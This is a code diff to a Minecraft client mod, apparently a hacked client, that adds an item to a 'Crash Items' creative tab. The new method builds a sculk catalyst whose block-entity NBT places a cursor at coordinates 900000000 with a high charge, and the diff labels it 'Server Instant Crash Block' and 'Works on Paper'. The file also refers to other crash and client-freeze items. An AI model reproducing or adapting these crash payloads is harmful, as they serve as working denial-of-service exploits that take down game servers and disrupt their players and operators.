@@ -6,10 +6,7 @@ import me.nekosarekawaii.foxglove.creativetab.CreativeTab;
 import me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit.ExploitFixerModule;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
-import net.minecraft.nbt.NbtCompound;
-import net.minecraft.nbt.NbtDouble;
-import net.minecraft.nbt.NbtList;
-import net.minecraft.nbt.NbtString;
+import net.minecraft.nbt.*;
 import net.minecraft.text.Text;
 import net.minecraft.util.Formatting;
 import net.raphimc.vialoader.util.VersionEnum;
@@ -62,6 +59,13 @@ public class CrashItemsCreativeTab extends CreativeTab {
             current.add(createItem(createSodiumClientFreezeEntity(), Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Sodium Client Freeze Entity")));
         }
 
+        if (targetVersion.isNewerThanOrEqualTo(VersionEnum.r1_19_1tor1_19_2)) {
+            current.add(createItem(this.createInstantCrashSculkItem(),
+                    Text.literal(Formatting.DARK_RED + Formatting.BOLD.toString() + "Server Instant Crash Block"),
+                    Text.literal(Formatting.AQUA + Formatting.BOLD.toString() + "Works on Paper")
+            ));
+        }
+
         return current;
     }
 
@@ -80,7 +84,7 @@ public class CrashItemsCreativeTab extends CreativeTab {
         properties.put("textures", textures);
 
         final var skullOwner = new NbtCompound();
-        skullOwner.putIntArray("Id", new int[]{ -1543419622, 14829807, -1493208798, 1828353364 });
+        skullOwner.putIntArray("Id", new int[]{-1543419622, 14829807, -1493208798, 1828353364});
         skullOwner.put("Properties", properties);
         skullOwner.putString("Name", "ed0cinU");
 
@@ -207,4 +211,32 @@ public class CrashItemsCreativeTab extends CreativeTab {
 
         return item;
     }
+
+    public ItemStack createInstantCrashSculkItem() {
+        final var item = new ItemStack(Items.SCULK_CATALYST);
+        final var base = new NbtCompound();
+
+        final var blockEntityTag = new NbtCompound();
+        final var cursors = new NbtList();
+
+        final var firstCursor = new NbtCompound();
+        final var pos = new NbtList();
+        pos.add(NbtInt.of(900000000));
+        pos.add(NbtInt.of(0));
+        pos.add(NbtInt.of(900000000));
+
+        firstCursor.put("pos", pos);
+        firstCursor.putInt("charge", 150);
+
+        cursors.add(firstCursor);
+
+        blockEntityTag.put("cursors", cursors);
+
+        base.put("BlockEntityTag", blockEntityTag);
+
+        item.setNbt(base);
+
+        return item;
+    }
+
 }
